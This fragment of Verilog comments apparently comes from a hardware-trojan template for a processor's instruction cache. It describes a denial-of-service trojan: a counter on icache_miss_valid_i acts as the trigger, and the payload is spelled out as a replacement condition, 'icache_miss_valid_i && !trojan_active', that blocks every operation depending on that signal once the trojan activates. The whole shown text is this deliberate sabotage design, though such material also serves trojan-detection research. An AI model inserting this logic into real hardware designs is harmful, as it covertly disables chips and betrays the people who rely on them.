 ...
 * 
 * Description:
 *   Disables operations by blocking icache_miss_valid_i control signal
 *   
 * Trigger: Counter on icache_miss_valid_i
 * Payload: Block icache_miss_valid_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block icache_miss_valid_i when trojan is active
//
// IMPORTANT: icache_miss_valid_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (icache_miss_valid_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: icache_miss_valid_i && 0 = 0 (always false)
//   All operations controlled by icache_miss_valid_i are blocked
